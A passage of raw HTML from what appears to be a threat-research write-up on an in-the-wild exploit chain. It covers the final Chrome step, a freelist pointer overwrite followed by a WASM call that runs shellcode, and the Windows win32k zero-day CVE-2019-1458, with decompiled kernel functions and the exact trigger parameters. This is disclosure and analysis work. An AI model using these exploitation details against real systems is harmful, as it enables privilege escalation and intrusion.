					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-676241da675ea478794217-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-676241da675ea478794217-1"><span class="crayon-e">write64</span><span class="crayon-sy">(</span><span class="crayon-i">freelist</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">partitionPagePtr</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">BigInt</span><span class="crayon-sy">(</span><span class="crayon-cn">0</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div><p>
Now, in order to execute the shellcode, it&#8217;s enough to call the exported WASM function.</p>
		<div id="crayon-676241da675ec447021132" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
try {
	wasmFuncA();
} catch (e) {}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-676241da675ec447021132-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675ec447021132-2">2</div><div class="crayon-num" data-line="crayon-676241da675ec447021132-3">3</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-676241da675ec447021132-1"><span class="crayon-st">try</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675ec447021132-2"><span class="crayon-h">	</span><span class="crayon-e">wasmFuncA</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675ec447021132-3"><span class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-st">catch</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-i">e</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div><p>
<h2 id="microsoft-windows-elevation-of-privilege-exploit">Microsoft Windows elevation of privilege exploit</h2>
<p>The shellcode appeared to be a Reflective PE loader for the Portable Executable module that was also present in the exploit. This module mostly consisted of the code to escape Google Chrome&#8217;s sandbox by exploiting the Windows kernel component win32k for the elevation of privileges and it was also responsible for downloading and executing the actual malware. On closer analysis, we found that the exploited vulnerability was in fact a zero-day. We notified Microsoft Security Response Center and they assigned it CVE-2019-1458 and fixed the vulnerability. The win32k component has something of bad reputation. It has been present since Windows NT 4.0 and, according to Microsoft, it is responsible for more than 50% of all kernel security bugs. In the last two years alone Kaspersky has found five zero-days in the wild that exploited win32k vulnerabilities. That&#8217;s quite an interesting statistic considering that since the release of Windows 10, Microsoft has implemented a number of mitigations aimed at complicating exploitation of win32k vulnerabilities and the majority of zero-days that we found exploited versions of Microsoft Windows prior to the release of Windows 10 RS4. The elevation of privilege exploit used in Operation WizardOpium was built to support Windows 7, Windows 10 build 10240 and Windows 10 build 14393. It&#8217;s also important to note that Google Chrome has a special security feature called <a href="https://googleprojectzero.blogspot.com/2016/11/breaking-chain.html">Win32k lockdown</a>. This security feature eliminates the whole win32k attack surface by disabling access to win32k syscalls from inside Chrome processes. Unfortunately, Win32k lockdown is only supported on machines running Windows 10. So, it&#8217;s fair to assume that Operation WizardOpium targeted users running Windows 7.</p>
<p>CVE-2019-1458 is an Arbitrary Pointer Dereference vulnerability. In win32k Window objects are represented by a tagWND structure. There are also a number of classes based on this structure: ScrollBar, Menu, Listbox, Switch and many others. The FNID field of tagWND structure is used to distinguish the type of class. Different classes also have various extra data appended to the tagWND structure. This extra data is basically just different structures that often include kernel pointers. Besides that, in the win32k component there&#8217;s a syscall SetWindowLongPtr that can be used to set this extra data (after validation of course). It&#8217;s worth noting that SetWindowLongPtr was related to a number of vulnerabilities in the past (e.g., CVE-2010-2744, CVE-2016-7255, and CVE-2019-0859). There&#8217;s a <a href="https://securelist.com/new-win32k-zero-day-cve-2019-0859/90435/">common issue</a> when pre-initialized extra data can lead to system procedures incorrectly handling. In the case of CVE-2019-1458, the validation performed by SetWindowLongPtr was just insufficient.</p>
		<div id="crayon-676241da675ed958109076" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
xxxSetWindowLongPtr(tagWND *pwnd, int index, QWORD data, ...)
	...
	if ( (int)index &gt;= gpsi-&gt;mpFnid_serverCBWndProc[(pwnd-&gt;fnid &amp; 0x3FFF) - 0x29A] - sizeof(tagWND) )
		...
		extraData = (BYTE*)tagWND + sizeof(tagWND) + index
		old = *(QWORD*)extraData;
		*(QWORD*)extraData = data;
		return old;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-676241da675ed958109076-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675ed958109076-2">2</div><div class="crayon-num" data-line="crayon-676241da675ed958109076-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675ed958109076-4">4</div><div class="crayon-num" data-line="crayon-676241da675ed958109076-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675ed958109076-6">6</div><div class="crayon-num" data-line="crayon-676241da675ed958109076-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675ed958109076-8">8</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-676241da675ed958109076-1"><span class="crayon-e">xxxSetWindowLongPtr</span><span class="crayon-sy">(</span><span class="crayon-e ">tagWND *</span><span class="crayon-i">pwnd</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-t">int</span><span class="crayon-h"> </span><span class="crayon-i">index</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">QWORD </span><span class="crayon-i">data</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675ed958109076-2"><span class="crayon-h">	</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span></div><div class="crayon-line" id="crayon-676241da675ed958109076-3"><span class="crayon-h">	</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-t">int</span><span class="crayon-sy">)</span><span class="crayon-i">index</span><span class="crayon-h"> </span><span class="crayon-h">&gt;</span>=<span class="crayon-h"> </span><span class="crayon-i">gpsi</span>-<span class="crayon-h">&gt;</span><span class="crayon-i">mpFnid_serverCBWndProc</span><span class="crayon-sy">[</span><span class="crayon-sy">(</span><span class="crayon-i">pwnd</span>-<span class="crayon-h">&gt;</span><span class="crayon-i">fnid</span><span class="crayon-h"> </span><span class="crayon-sy">&amp; 0x3FFF) - 0x29A] - sizeof(tagWND) )</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675ed958109076-4"><span class="crayon-sy">		...</span></div><div class="crayon-line" id="crayon-676241da675ed958109076-5"><span class="crayon-sy">		extraData = (BYTE*)tagWND + sizeof(tagWND) + index</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675ed958109076-6"><span class="crayon-sy">		old = *(QWORD*)extraData;</span></div><div class="crayon-line" id="crayon-676241da675ed958109076-7"><span class="crayon-h">		</span>*<span class="crayon-sy">(</span><span class="crayon-e ">QWORD*</span><span class="crayon-sy">)</span><span class="crayon-i">extraData</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-i">data</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675ed958109076-8"><span class="crayon-h">		</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-i">old</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div><p>
A check for the index parameter would have prevented this bug, but prior to the patch the values for FNID_DESKTOP, FNID_SWITCH, FNID_TOOLTIPS inside the mpFnid_serverCBWndProc table were not initialized, rendering this check useless and allowing the kernel pointers inside the extra data to be overwritten.</p>
<p>Triggering the bug is quite simple: at first, you create a Window, then NtUserMessageCall can be used to call any system class window procedure.</p>
		<div id="crayon-676241da675ef174509780" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
gpsi-&gt;mpFnidPfn[(dwType + 6) &amp; 0x1F]((tagWND *)wnd, msg, wParam, lParam, resultInfo);</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-676241da675ef174509780-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-676241da675ef174509780-1"><span class="crayon-i">gpsi</span>-<span class="crayon-h">&gt;</span><span class="crayon-i">mpFnidPfn</span><span class="crayon-sy">[</span><span class="crayon-sy">(</span><span class="crayon-i">dwType</span><span class="crayon-h"> </span>+<span class="crayon-h"> </span><span class="crayon-cn">6</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">&amp; 0x1F]((tagWND *)wnd, msg, wParam, lParam, resultInfo);</span></div></div></td>
					</tr>
				</table>
			</div>
		</div><p>
It&#8217;s important to provide the right message and dwType parameters. The message needs to be equal to WM_CREATE. dwType is converted to fnIndex internally with the following calculation: (dwType + 6) &amp; 0x1F. The exploit uses a dwType equal to 0xE0. It results in an fnIndex equal to 6 which is the function index of <em>xxxSwitchWndProc </em>and the WM_CREATE message sets the FNID field to be equal to FNID_SWITCH.</p>
		<div id="crayon-676241da675f0019503203" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
LRESULT xxxSwitchWndProc(tagWND *wnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
...
  pti = *(tagTHREADINFO **)&amp;gptiCurrent;
  if ( wnd-&gt;fnid != FNID_SWITCH )
  {
    if ( wnd-&gt;fnid || wnd-&gt;cbwndExtra + 296 &lt; (unsigned int)gpsi-&gt;mpFnid_serverCBWndProc[6] )
      return 0i64;
    if ( msg != 1 )
      return xxxDefWindowProc(wnd, msg, wParam, lParam);
    if ( wnd[1].head.h )
      return 0i64;
    wnd-&gt;fnid = FNID_SWITCH;
  }
  switch ( msg )
  {
    case WM_CREATE:
      zzzSetCursor(wnd-&gt;pcls-&gt;spcur, pti, 0i64);
      break;
    case WM_CLOSE:
      xxxSetWindowPos(wnd, 0, 0);
      xxxCancelCoolSwitch();
      break;
    case WM_ERASEBKGND:
    case WM_FULLSCREEN:
      pti-&gt;ptl = (_TL *)&amp;pti-&gt;ptl;
      ++wnd-&gt;head.cLockObj;
      xxxPaintSwitchWindow(wnd, pti, 0i64);
      ThreadUnlock1();
      return 0i64;
  }
  return xxxDefWindowProc(wnd, msg, wParam, lParam);
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-676241da675f0019503203-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675f0019503203-2">2</div><div class="crayon-num" data-line="crayon-676241da675f0019503203-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675f0019503203-4">4</div><div class="crayon-num" data-line="crayon-676241da675f0019503203-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675f0019503203-6">6</div><div class="crayon-num" data-line="crayon-676241da675f0019503203-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675f0019503203-8">8</div><div class="crayon-num" data-line="crayon-676241da675f0019503203-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675f0019503203-10">10</div><div class="crayon-num" data-line="crayon-676241da675f0019503203-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675f0019503203-12">12</div><div class="crayon-num" data-line="crayon-676241da675f0019503203-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675f0019503203-14">14</div><div class="crayon-num" data-line="crayon-676241da675f0019503203-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675f0019503203-16">16</div><div class="crayon-num" data-line="crayon-676241da675f0019503203-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675f0019503203-18">18</div><div class="crayon-num" data-line="crayon-676241da675f0019503203-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675f0019503203-20">20</div><div class="crayon-num" data-line="crayon-676241da675f0019503203-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675f0019503203-22">22</div><div class="crayon-num" data-line="crayon-676241da675f0019503203-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675f0019503203-24">24</div><div class="crayon-num" data-line="crayon-676241da675f0019503203-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675f0019503203-26">26</div><div class="crayon-num" data-line="crayon-676241da675f0019503203-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675f0019503203-28">28</div><div class="crayon-num" data-line="crayon-676241da675f0019503203-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675f0019503203-30">30</div><div class="crayon-num" data-line="crayon-676241da675f0019503203-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675f0019503203-32">32</div><div class="crayon-num" data-line="crayon-676241da675f0019503203-33">33</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-676241da675f0019503203-1"><span class="crayon-e">LRESULT </span><span class="crayon-e">xxxSwitchWndProc</span><span class="crayon-sy">(</span><span class="crayon-e ">tagWND *</span><span class="crayon-i">wnd</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">UINT </span><span class="crayon-i">msg</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">WPARAM </span><span class="crayon-i">wParam</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">LPARAM </span><span class="crayon-i">lParam</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675f0019503203-2"><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-676241da675f0019503203-3"><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675f0019503203-4"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-i">pti</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span>*<span class="crayon-sy">(</span><span class="crayon-e ">tagTHREADINFO *</span>*<span class="crayon-sy">)</span><span class="crayon-sy">&amp;gptiCurrent;</span></div><div class="crayon-line" id="crayon-676241da675f0019503203-5"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-i">wnd</span>-<span class="crayon-h">&gt;</span><span class="crayon-i">fnid</span><span class="crayon-h"> </span><span class="crayon-sy">!</span>=<span class="crayon-h"> </span><span class="crayon-i">FNID_SWITCH</span><span class="crayon-h"> </span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675f0019503203-6"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-676241da675f0019503203-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-i">wnd</span>-<span class="crayon-h">&gt;</span><span class="crayon-i">fnid</span><span class="crayon-h"> </span><span class="crayon-sy">|</span><span class="crayon-sy">|</span><span class="crayon-h"> </span><span class="crayon-i">wnd</span>-<span class="crayon-h">&gt;</span><span class="crayon-i">cbwndExtra</span><span class="crayon-h"> </span>+<span class="crayon-h"> </span><span class="crayon-cn">296</span><span class="crayon-h"> </span><span class="crayon-h">&lt;</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-t">unsigned</span><span class="crayon-h"> </span><span class="crayon-t">int</span><span class="crayon-sy">)</span><span class="crayon-i">gpsi</span>-<span class="crayon-h">&gt;</span><span class="crayon-i">mpFnid_serverCBWndProc</span><span class="crayon-sy">[</span><span class="crayon-cn">6</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675f0019503203-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-cn">0i64</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675f0019503203-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-i">msg</span><span class="crayon-h"> </span><span class="crayon-sy">!</span>=<span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-h"> </span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675f0019503203-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-e">xxxDefWindowProc</span><span class="crayon-sy">(</span><span class="crayon-i">wnd</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">msg</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">wParam</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">lParam</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675f0019503203-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-i">wnd</span><span class="crayon-sy">[</span><span class="crayon-cn">1</span><span class="crayon-sy">]</span><span class="crayon-sy">.</span><span class="crayon-i">head</span><span class="crayon-sy">.</span><span class="crayon-i">h</span><span class="crayon-h"> </span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675f0019503203-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-cn">0i64</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675f0019503203-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">wnd</span>-<span class="crayon-h">&gt;</span><span class="crayon-i">fnid</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-i">FNID_SWITCH</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675f0019503203-14"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-676241da675f0019503203-15"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-st">switch</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-i">msg</span><span class="crayon-h"> </span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675f0019503203-16"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-676241da675f0019503203-17"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">case</span><span class="crayon-h"> </span><span class="crayon-i">WM_CREATE</span><span class="crayon-sy">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675f0019503203-18"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">zzzSetCursor</span><span class="crayon-sy">(</span><span class="crayon-i">wnd</span>-<span class="crayon-h">&gt;</span><span class="crayon-i">pcls</span>-<span class="crayon-h">&gt;</span><span class="crayon-i">spcur</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">pti</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0i64</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675f0019503203-19"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">break</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675f0019503203-20"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">case</span><span class="crayon-h"> </span><span class="crayon-i">WM_CLOSE</span><span class="crayon-sy">:</span></div><div class="crayon-line" id="crayon-676241da675f0019503203-21"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">xxxSetWindowPos</span><span class="crayon-sy">(</span><span class="crayon-i">wnd</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675f0019503203-22"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">xxxCancelCoolSwitch</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675f0019503203-23"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">break</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675f0019503203-24"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">case</span><span class="crayon-h"> </span><span class="crayon-i">WM_ERASEBKGND</span><span class="crayon-sy">:</span></div><div class="crayon-line" id="crayon-676241da675f0019503203-25"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">case</span><span class="crayon-h"> </span><span class="crayon-i">WM_FULLSCREEN</span><span class="crayon-sy">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675f0019503203-26"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">pti</span>-<span class="crayon-h">&gt;</span><span class="crayon-i">ptl</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e ">_TL *</span><span class="crayon-sy">)</span><span class="crayon-sy">&amp;pti-&gt;ptl;</span></div><div class="crayon-line" id="crayon-676241da675f0019503203-27"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>++<span class="crayon-i">wnd</span>-<span class="crayon-h">&gt;</span><span class="crayon-i">head</span><span class="crayon-sy">.</span><span class="crayon-i">cLockObj</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675f0019503203-28"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">xxxPaintSwitchWindow</span><span class="crayon-sy">(</span><span class="crayon-i">wnd</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">pti</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0i64</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div 